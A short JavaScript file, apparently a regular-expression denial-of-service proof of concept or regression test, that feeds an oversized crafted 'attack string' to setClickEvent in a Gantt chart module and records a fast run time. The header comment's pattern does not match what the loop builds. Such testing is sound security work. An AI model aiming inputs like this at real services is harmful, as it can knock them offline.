import { setClickEvent } from "./ganttDb.js";

//Attack String :""+"=,A"*100000+"@""
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "aaa";
}
str += '@"';

var result = setClickEvent("1", "a", str);

// real    0m0.078s
// user    0m0.051s
// sys     0m0.013s
